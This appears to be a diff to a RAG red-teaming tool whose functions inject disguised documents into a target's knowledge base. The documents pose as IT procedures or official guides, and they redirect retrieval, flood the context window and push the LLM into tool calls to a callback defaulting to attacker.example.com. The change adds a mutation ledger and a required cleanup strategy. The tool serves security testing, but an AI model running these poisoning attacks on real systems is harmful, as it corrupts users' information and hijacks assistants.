@@ -23,9 +23,11 @@ logger = logging.getLogger(__name__)
 
 import httpx
 
+from ragdrag.adapters.chat import extract_response_text
 from ragdrag.core.evade import camouflage_document
 from ragdrag.core.models import Finding
-from ragdrag.core.poison import InjectedDocument, inject_document
+from ragdrag.core.poison import CleanupStrategy, InjectedDocument, UnsafeMutationError, inject_document
+from ragdrag.engine.mutations import MutationLedger
 
 
 # --- Data structures ---
@@ -99,10 +101,12 @@ def redirect_retrieval(
     target: str,
     client: httpx.Client,
     ingest_url: str | None = None,
-    api_key: str | None = None,
     query_field: str = "query",
     response_field: str | None = None,
     use_camouflage: bool = False,
+    *,
+    mutations: MutationLedger | None = None,
+    cleanup_strategy: CleanupStrategy | None = None,
 ) -> list[Finding]:
     """RD-0501: Redirect retrieval for specific queries to attacker content."""
     findings: list[Finding] = []
@@ -115,7 +119,7 @@ def redirect_retrieval(
         finding, doc = inject_document(
             target, client, content,
             metadata={"source": "IT Department", "type": "procedure_update"},
-            ingest_url=ingest_url, api_key=api_key,
+            ingest_url=ingest_url, mutations=mutations, cleanup_strategy=cleanup_strategy,
         )
         if finding:
             findings.append(finding)
@@ -127,10 +131,7 @@ def redirect_retrieval(
         for query in redir["verification_queries"]:
             try:
                 resp = client.post(target, json={query_field: query})
-                text = (
-                    resp.text if response_field is None
-                    else str(resp.json().get(response_field, ""))
-                )
+                text = extract_response_text(resp, response_field)
                 marker = redir["redirect_content"][:50].lower()
                 if marker in text.lower():
                     redirected += 1
@@ -170,10 +171,12 @@ def saturate_context_window(
     topic: str,
     num_documents: int = 5,
     ingest_url: str | None = None,
-    api_key: str | None = None,
     query_field: str = "query",
     response_field: str | None = None,
     use_camouflage: bool = False,
+    *,
+    mutations: MutationLedger | None = None,
+    cleanup_strategy: CleanupStrategy | None = None,
 ) -> list[Finding]:
     """RD-0502: Flood the context window with attacker-controlled content."""
     findings: list[Finding] = []
@@ -199,7 +202,7 @@ def saturate_context_window(
         finding, doc = inject_document(
             target, client, content,
             metadata={"source": f"Official {topic} Guide v{i + 1}", "type": "documentation"},
-            ingest_url=ingest_url, api_key=api_key,
+            ingest_url=ingest_url, mutations=mutations, cleanup_strategy=cleanup_strategy,
         )
         if finding:
             findings.append(finding)
@@ -211,10 +214,7 @@ def saturate_context_window(
 
     try:
         resp = client.post(target, json={query_field: f"Tell me everything about {topic}"})
-        text = (
-            resp.text if response_field is None
-            else str(resp.json().get(response_field, ""))
-        )
+        text = extract_response_text(resp, response_field)
 
         marker = f"COMPREHENSIVE GUIDE TO {topic.upper()}"
         text_lower = text.lower()
@@ -273,9 +273,11 @@ def manipulate_tool_calls(
     client: httpx.Client,
     callback_url: str,
     ingest_url: str | None = None,
-    api_key: str | None = None,
     query_field: str = "query",
     response_field: str | None = None,
+    *,
+    mutations: MutationLedger | None = None,
+    cleanup_strategy: CleanupStrategy | None = None,
 ) -> list[Finding]:
     """RD-0503: Inject documents that cause the LLM to call external tools."""
     findings: list[Finding] = []
@@ -286,7 +288,7 @@ def manipulate_tool_calls(
         finding, doc = inject_document(
             target, client, content,
             metadata={"source": "Security Policy", "type": "automation_directive"},
-            ingest_url=ingest_url, api_key=api_key,
+            ingest_url=ingest_url, mutations=mutations, cleanup_strategy=cleanup_strategy,
         )
         if finding:
             findings.append(finding)
@@ -296,10 +298,7 @@ def manipulate_tool_calls(
 
         try:
             resp = client.post(target, json={query_field: payload["trigger_query"]})
-            text = (
-                resp.text if response_field is None
-                else str(resp.json().get(response_field, ""))
-            )
+            text = extract_response_text(resp, response_field)
 
             tool_indicators = sum(
                 1 for pattern in payload["success_indicators"]
@@ -365,10 +364,7 @@ def assess_persistence(
         for query in check["queries"]:
             try:
                 resp = client.post(target, json={query_field: query})
-                text = (
-                    resp.text if response_field is None
-                    else str(resp.json().get(response_field, ""))
-                )
+                text = extract_response_text(resp, response_field)
                 if content_marker in text.lower():
                     found = True
                     break
@@ -410,10 +406,12 @@ def run_hijack(
     client: httpx.Client,
     callback_url: str | None = None,
     ingest_url: str | None = None,
-    api_key: str | None = None,
     query_field: str = "query",
     response_field: str | None = None,
     use_camouflage: bool = False,
+    *,
+    mutations: MutationLedger | None = None,
+    cleanup_strategy: CleanupStrategy | None = None,
 ) -> HijackResult:
     """Run R5 hijack techniques against a target.
 
@@ -422,7 +420,8 @@ def run_hijack(
         client: httpx.Client instance.
         callback_url: URL for tool manipulation callbacks.
         ingest_url: Override ingestion endpoint URL.
-        api_key: API key for authenticated ingestion.
+        mutations: Ledger for every document write attempt.
+        cleanup_strategy: Same-origin document deletion strategy.
         query_field: JSON field name for the query.
         response_field: JSON field to read the response from.
         use_camouflage: Wrap injected documents in R6 camouflage.
@@ -430,12 +429,16 @@ def run_hijack(
     Returns:
         HijackResult with all findings.
     """
+    if mutations is None:
+        raise UnsafeMutationError("mutation ledger is required before hijack execution")
+    if cleanup_strategy is None:
+        raise UnsafeMutationError("cleanup strategy is required before hijack execution")
     result = HijackResult(target=target)
 
     # RD-0501: Retrieval Redirection
     redir_findings = redirect_retrieval(
         target, client,
-        ingest_url=ingest_url, api_key=api_key,
+        ingest_url=ingest_url, mutations=mutations, cleanup_strategy=cleanup_strategy,
         query_field=query_field, response_field=response_field,
         use_camouflage=use_camouflage,
     )
@@ -449,7 +452,7 @@ def run_hijack(
     # RD-0502: Context Window Saturation
     saturation_findings = saturate_context_window(
         target, client, topic="security",
-        ingest_url=ingest_url, api_key=api_key,
+        ingest_url=ingest_url, mutations=mutations, cleanup_strategy=cleanup_strategy,
         query_field=query_field, response_field=response_field,
         use_camouflage=use_camouflage,
     )
@@ -462,7 +465,7 @@ def run_hijack(
     callback = callback_url or "attacker.example.com"
     tool_findings = manipulate_tool_calls(
         target, client, callback,
-        ingest_url=ingest_url, api_key=api_key,
+        ingest_url=ingest_url, mutations=mutations, cleanup_strategy=cleanup_strategy,
         query_field=query_field, response_field=response_field,
     )
     result.findings.extend(tool_findings)
